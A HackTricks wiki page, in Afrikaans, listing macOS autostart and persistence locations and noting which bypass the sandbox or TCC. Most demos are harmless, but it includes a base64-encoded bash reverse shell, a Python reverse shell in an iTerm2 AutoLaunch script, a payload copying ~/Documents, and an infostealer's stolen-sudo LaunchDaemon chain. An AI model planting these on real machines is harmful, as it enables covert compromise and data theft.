# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Hierdie afdeling is sterk gebaseer op die blogreeks [**Beyond the good ol’ LaunchAgents**](https://theevilbit.github.io/beyond/); die doel is om **meer Autostart Locations** by te voeg (indien moontlik), aan te dui **watter tegnieke** steeds werk met die nuutste weergawe van macOS (13.4), en die vereiste **permissions** te spesifiseer.

## Sandbox Bypass

> [!TIP]
> Hier kan jy start locations vind wat nuttig is vir **sandbox bypass**, wat jou toelaat om eenvoudig iets uit te voer deur dit **in ’n lêer te skryf** en te wag vir ’n baie **algemene** **aksie**, ’n bepaalde **tydsduur** of ’n **aksie wat jy gewoonlik kan uitvoer** vanuit ’n sandbox sonder dat root permissions nodig is.

### Launchd

- Nuttig vir sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Herlaai
- Root required
- **`/Library/LaunchDaemons`**
- **Trigger**: Herlaai
- Root required
- **`/System/Library/LaunchAgents`**
- **Trigger**: Herlaai
- Root required
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Herlaai
- Root required
- **`~/Library/LaunchAgents`**
- **Trigger**: Her-aanmelding
- **`~/Library/LaunchDemons`**
- **Trigger**: Her-aanmelding

> [!TIP]
> As ’n interessante feit het **`launchd`** ’n ingebedde property list in die Mach-o-afdeling `__Text.__config`, wat ander bekende services bevat wat launchd moet start. Boonop kan hierdie services die `RequireSuccess`, `RequireRun` en `RebootOnSuccess` bevat, wat beteken dat hulle uitgevoer en suksesvol voltooi moet word.
>
> Ofc, dit kan nie gewysig word nie weens code signing.

#### Description & Exploitation

**`launchd`** is die **eerste** **proses** wat tydens opstart deur die OX S kernel uitgevoer word en die laaste een wat tydens afskakeling klaarmaak. Dit behoort altyd die **PID 1** te hê. Hierdie proses sal die konfigurasies wat in die **ASEP** **plists** aangedui word, in die volgende liggings **lees en uitvoer**:

- `/Library/LaunchAgents`: Per-user agents wat deur die admin geïnstalleer is
- `/Library/LaunchDaemons`: Stelselwye daemons wat deur die admin geïnstalleer is
- `/System/Library/LaunchAgents`: Per-user agents wat deur Apple verskaf word.
- `/System/Library/LaunchDaemons`: Stelselwye daemons wat deur Apple verskaf word.

Wanneer ’n gebruiker aanmeld, word die plists in `/Users/$USER/Library/LaunchAgents` en `/Users/$USER/Library/LaunchDemons` met die **aangemelde gebruiker se permissions** gestart.

Die **belangrikste verskil tussen agents en daemons is dat agents gelaai word wanneer die gebruiker aanmeld, terwyl daemons tydens stelselopstart gelaai word** (omdat daar services soos ssh is wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel verkry). Agents kan ook GUI gebruik, terwyl daemons in die agtergrond moet loop.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Daar is gevalle waar ’n **agent uitgevoer moet word voordat die gebruiker aanmeld**, dit word **PreLoginAgents** genoem. Dit is byvoorbeeld nuttig om ondersteunende tegnologie tydens aanmelding te verskaf. Hulle kan ook in `/Library/LaunchAgents` gevind word (sien [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ’n voorbeeld).

> [!TIP]
> Nuwe Daemons- of Agents-konfigurasielêers sal **ná die volgende herlaai of deur gebruik van** `launchctl load <target.plist>` **gelaai word**. Dit is **ook moontlik om .plist-lêers sonder daardie uitbreiding te laai** met `launchctl -F <file>` (daardie plist-lêers sal egter nie outomaties ná herlaai gelaai word nie).\
> Dit is ook moontlik om dit te **ontlaai** met `launchctl unload <target.plist>` (die proses waarna dit wys, sal beëindig word),
>
> Om te **verseker** dat daar nie **enigiets** (soos ’n override) is wat ’n **Agent** of **Daemon** **verhoed** **om** **te loop nie**, voer uit: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Lys al die agents en daemons wat deur die huidige gebruiker gelaai is:
```bash
launchctl list
```
#### Voorbeeld van `malicious LaunchDaemon`-ketting (hergebruik van wagwoord)

'n Onlangse macOS-infostealer het 'n **vasgelegde sudo-wagwoord** hergebruik om 'n user agent en 'n root LaunchDaemon te installeer:<sup>[[1]](#references)</sup>

- Skryf die agent-lus na `~/.agent` en maak dit uitvoerbaar.
- Genereer 'n plist in `/tmp/starter` wat na daardie agent wys.
- Hergebruik die gesteelde wagwoord met `sudo -S` om dit na `/Library/LaunchDaemons/com.finder.helper.plist` te kopieer, stel `root:wheel` in en laai dit met `launchctl load`.
- Begin die agent stilweg via `nohup ~/.agent >/dev/null 2>&1 &` om uitvoer te ontkoppel.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Indien 'n plist deur 'n user besit word, selfs al is dit in daemon-stelselwye vouers, sal die **task as die user** en nie as root uitgevoer word nie. Dit kan sommige privilege escalation-aanvalle voorkom.

#### Meer inligting oor launchd

**`launchd`** is die **eerste user mode process** wat vanaf die **kernel** begin word. Die process-start moet **suksesvol** wees en dit **kan nie exit of crash nie**. Dit is selfs **beskerm** teen sommige **killing signals**.

Een van die eerste dinge wat `launchd` sou doen, is om al die **daemons** te **start**, soos:

- **Timer daemons** gebaseer op die tyd waarop dit uitgevoer moet word:
- atd (`com.apple.atrun.plist`): Het 'n `StartInterval` van 30min
- crond (`com.apple.systemstats.daily.plist`): Het `StartCalendarInterval` om om 00:15 te start
- **Network daemons** soos:
- `org.cups.cups-lpd`: Luister op TCP (`SockType: stream`) met `SockServiceName: printer`
- SockServiceName moet óf 'n port óf 'n diens uit `/etc/services` wees
- `com.apple.xscertd.plist`: Luister op TCP in port 1640
- **Path daemons** wat uitgevoer word wanneer 'n gespesifiseerde path verander:
- `com.apple.postfix.master`: Kontroleer die path `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Dit dui in die `MachServices`-entry die naam `com.apple.xscertd.helper` aan
- **UserEventAgent:**
- Dit verskil van die vorige een. Dit laat launchd apps spawn in reaksie op spesifieke events. In hierdie geval is die hoofbinary wat betrokke is egter nie `launchd` nie, maar `/usr/libexec/UserEventAgent`. Dit laai plugins vanaf die SIP-beperkte folder `/System/Library/UserEventPlugins/`, waar elke plugin sy initialiser in die `XPCEventModuleInitializer`-key aandui, of, in die geval van ouer plugins, in die `CFPluginFactories`-dict onder die key `FB86416D-6164-2070-726F-70735C216EC0` van sy `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet 'n app vind met 'n TCC bypass wat 'n shell uitvoer wat hierdie files laai

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Open 'n terminal met zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Open 'n terminal met zsh
- Root vereis
- **`~/.zlogout`**
- **Trigger**: Verlaat 'n terminal met zsh
- **`/etc/zlogout`**
- **Trigger**: Verlaat 'n terminal met zsh
- Root vereis
- Potensieel meer in: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Open 'n terminal met bash
- `/etc/profile` (het nie gewerk nie)
- `~/.profile` (het nie gewerk nie)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Daar word verwag dat dit met xterm trigger, maar dit **is nie geïnstalleer nie**, en selfs nadat dit geïnstalleer is, word hierdie error gegooi: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Beskrywing & Exploitation

Wanneer 'n shell-environment soos `zsh` of `bash` geïnisieer word, word **sekere startup files uitgevoer**. macOS gebruik tans `/bin/zsh` as die default shell. Hierdie shell word outomaties verkry wanneer die Terminal application geloods word of wanneer 'n device via SSH verkry word. Hoewel `bash` en `sh` ook in macOS teenwoordig is, moet hulle eksplisiet invoked word om dit te gebruik.<sup>[[2]](#references)</sup>

Die man page van zsh, wat ons met **`man zsh`** kan lees, het 'n lang beskrywing van die startup files.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Hertoopende toepassings

> [!CAUTION]
> Die konfigurasie van die aangeduide exploitation en die uit- en weer aanmelding, of selfs herlaai, het nie die app tydens testing uitgevoer nie. Die app moet moontlik loop wanneer hierdie aksies uitgevoer word.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Sneller**: Herlaai, wat toepassings heropen

#### Beskrywing & Exploitation

Al die toepassings wat heropen moet word, is binne die plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Om die toepassings wat heropen moet word jou eie app te laat launch, hoef jy net **jou app by die lys te voeg**.

Die UUID kan gevind word deur daardie gids te lys of met `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Om die toepassings wat heropen sal word, na te gaan, kan jy doen:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Om **'n toepassing by hierdie lys te voeg**, kan jy gebruik:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal-voorkeure

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
- Terminal het voorheen FDA-permissies gehad van die gebruiker wat dit gebruik

#### Ligging

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Sneller**: Maak Terminal oop

#### Beskrywing & Exploitation

In **`~/Library/Preferences`** word die voorkeure van die gebruiker in die toepassings gestoor. Sommige van hierdie voorkeure kan ’n konfigurasie bevat om ander toepassings/scripts te **execute**.<sup>[[5]](#references)</sup>

Terminal kan byvoorbeeld ’n opdrag tydens Startup uitvoer:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Hierdie konfigurasie word soos volg in die lêer **`~/Library/Preferences/com.apple.Terminal.plist`** weerspieël:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Dus, indien die plist van die terminal se voorkeure in die stelsel oorskryf kon word, kan die **`open`**-funksionaliteit gebruik word om **die terminal oop te maak, en daardie opdrag sal uitgevoer word**.

Jy kan dit vanaf die CLI byvoeg met:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Ander lêeruitbreidings

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal word gebruik om FDA-toestemmings van die gebruiker te hê wat dit gebruik

#### Ligging

- **Enige plek**
- **Sneller**: Maak Terminal oop

#### Beskrywing & Exploitation

As jy 'n [**`.terminal`**-script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) skep en dit oopmaak, sal die **Terminal application** outomaties aangeroep word om die opdragte wat daarin aangedui word, uit te voer. As die Terminal-app spesiale privileges het (soos TCC), sal jou opdrag met daardie spesiale privileges uitgevoer word.

Probeer dit met:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Jy kan ook die uitbreidings **`.command`**, **`.tool`** gebruik, met gewone shell scripts-inhoud, en hulle sal ook deur Terminal oopgemaak word.

> [!CAUTION]
> As Terminal **Full Disk Access** het, sal dit daardie aksie kan voltooi (let daarop dat die uitgevoerde command in 'n Terminal-venster sigbaar sal wees).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Jy kan moontlik ekstra TCC-toegang kry

#### Ligging

- **`/Library/Audio/Plug-Ins/HAL`**
- Root vereis
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`/Library/Audio/Plug-ins/Components`**
- Root vereis
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`/System/Library/Components`**
- Root vereis
- **Trigger**: Herbegin coreaudiod of die rekenaar

#### Beskrywing

Volgens die vorige writeups is dit moontlik om **sommige audio plugins te compile** en hulle te laat laai.<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Jy kan moontlik ekstra TCC-toegang kry

#### Ligging

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beskrywing & Exploitation

QuickLook plugins kan uitgevoer word wanneer jy **die preview van 'n lêer trigger** (druk die spasiebalk met die lêer in Finder gekies) en 'n **plugin wat daardie lêertipe ondersteun** geïnstalleer is.<sup>[[8]](#references)</sup>

Dit is moontlik om jou eie QuickLook plugin te compile, dit in een van die vorige liggings te plaas om dit te laat laai, en dan na 'n ondersteunde lêer te gaan en spasie te druk om dit te trigger.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Dit het nie vir my gewerk nie, nóg met die gebruiker se LoginHook nóg met die root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Jy moet iets soos `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` kan uitvoer
- Geleë in `~/Library/Preferences/com.apple.loginwindow.plist`

Hulle is deprecated, maar kan gebruik word om commands uit te voer wanneer 'n gebruiker aanmeld.<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Hierdie instelling word gestoor in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Om dit te verwyder:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Die root-gebruiker s'n word gestoor in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Voorwaardelike Sandbox Bypass

> [!TIP]
> Hier kan jy start locations vind wat nuttig is vir **sandbox bypass**, wat jou toelaat om eenvoudig iets uit te voer deur dit **in 'n lêer te skryf** en **nie-super-algemene toestande te verwag** soos spesifieke **programme wat geïnstalleer is, "ongewone" gebruiker**-aksies of omgewings.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Jy moet egter die `crontab`-binary kan uitvoer
- Of root wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root word vereis vir direkte skryftoegang. Geen root word vereis indien jy `crontab <file>` kan uitvoer nie
- **Trigger**: Hang van die cron job af

#### Beskrywing & Exploitasie

Lys die cron jobs van die **huidige gebruiker** met:
```bash
crontab -l
```
Jy kan ook al die cron jobs van die gebruikers in **`/usr/lib/cron/tabs/`** en **`/var/at/tabs/`** sien (benodig root).

In MacOS kan verskeie vouers wat scripts met **’n sekere frekwensie** uitvoer, gevind word in:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Daar kan jy die gewone **cron**-**take**, die **at**-**take** (wat nie baie gebruik word nie) en die **periodic**-**take** (hoofsaaklik gebruik om tydelike lêers skoon te maak) vind. Die daaglikse **periodic**-take kan byvoorbeeld uitgevoer word met: `periodic daily`.<sup>[[10]](#references)</sup>

Om programmaties ’n gebruiker-cronjob by te voeg, kan die volgende gebruik word:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 het voorheen granted TCC permissions gehad

#### Ligginge

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Sneller**: Open iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Sneller**: Open iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Sneller**: Open iTerm

#### Beskrywing & Exploitation

Scripts wat in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** gestoor word, sal uitgevoer word. Byvoorbeeld:<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
of:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Die **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**-script sal ook uitgevoer word:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Die iTerm2-voorkeure wat in **`~/Library/Preferences/com.googlecode.iterm2.plist`** geleë is, kan **'n opdrag aandui om uit te voer** wanneer die iTerm2-terminale oopgemaak word.

Hierdie instelling kan in die iTerm2-instellings gekonfigureer word:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

En die opdrag word in die voorkeure weerspieël:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Jy kan die opdrag om uit te voer instel met:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Dit is hoogs waarskynlik dat daar **ander maniere is om die iTerm2-voorkeure te misbruik** om arbitrêre commands uit te voer.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar xbar moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit versoek Accessibility-permissies

#### Ligging

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Sodra xbar uitgevoer word

#### Beskrywing

As die gewilde program [**xbar**](https://github.com/matryer/xbar) geïnstalleer is, is dit moontlik om ’n shell script in **`~/Library/Application\ Support/xbar/plugins/`** te skryf wat uitgevoer sal word wanneer xbar gestart word:<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar Hammerspoon moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit versoek Accessibility-toestemmings

#### Ligging

- **`~/.hammerspoon/init.lua`**
- **Sneller**: Sodra Hammerspoon uitgevoer word

#### Beskrywing

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as ’n outomatiseringsplatform vir **macOS**, wat die **LUA scripting language** vir sy bedrywighede gebruik. Dit ondersteun veral die integrasie van volledige AppleScript-kode en die uitvoering van shell scripts, wat sy scripting-vermoëns aansienlik uitbrei.<sup>[[13]](#references)</sup>

Die toepassing soek na ’n enkele lêer, `~/.hammerspoon/init.lua`, en wanneer dit begin word, sal die script uitgevoer word.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar BetterTouchTool moet geïnstalleer wees
- TCC-bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit versoek Automation-Shortcuts- en Accessibility-permissies

#### Ligging

- `~/Library/Application Support/BetterTouchTool/*`

Hierdie tool laat jou toe om toepassings of scripts aan te dui wat uitgevoer moet word wanneer sekere shortcuts gedruk word. ’n Aanvaller kan moontlik sy eie **shortcut en aksie om in die databasis uit te voer** opstel sodat dit arbitrêre kode uitvoer (’n shortcut kan bloot wees om ’n sleutel te druk).

### Alfred

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar Alfred moet geïnstalleer wees
- TCC-bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit versoek Automation-, Accessibility- en selfs Full-Disk access-permissies

#### Ligging

- `???`

Dit laat jou toe om workflows te skep wat kode kan uitvoer wanneer sekere voorwaardes nagekom word. Dit is moontlik dat ’n aanvaller ’n workflow-lêer kan skep en Alfred dit kan laat laai (dit is nodig om vir die premium weergawe te betaal om workflows te gebruik).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar ssh moet geaktiveer en gebruik word
- TCC-bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH het FDA-toegang

#### Ligging

- **`~/.ssh/rc`**
- **Trigger**: Aanmelding via ssh
- **`/etc/ssh/sshrc`**
- Root word vereis
- **Trigger**: Aanmelding via ssh

> [!CAUTION]
> Om ssh aan te skakel, word Full Disk Access vereis:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Beskrywing & Exploitation

By verstek, tensy `PermitUserRC no` in `/etc/ssh/sshd_config` gestel is, sal die scripts **`/etc/ssh/sshrc`** en **`~/.ssh/rc`** uitgevoer word wanneer ’n gebruiker **via SSH aanmeld**.<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet `osascript` met args uitvoer
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Liggings

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Aanmelding
- Exploit-payload gestoor wat `osascript` oproep
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Aanmelding
- Root word vereis

#### Beskrywing

In System Preferences -> Users & Groups -> **Login Items** kan jy **items vind wat uitgevoer word wanneer die gebruiker aanmeld**.\
Dit is moontlik om hulle vanaf die command line te lys, by te voeg en te verwyder:<sup>[[15]](#references)</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Hierdie items word in die lêer **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** gestoor

**Login items** kan **ook aangedui word** deur die API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) te gebruik, wat die konfigurasie in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** sal stoor

### ZIP as Login Item

(Kyk na die vorige afdeling oor Login Items; dit is ’n uitbreiding)

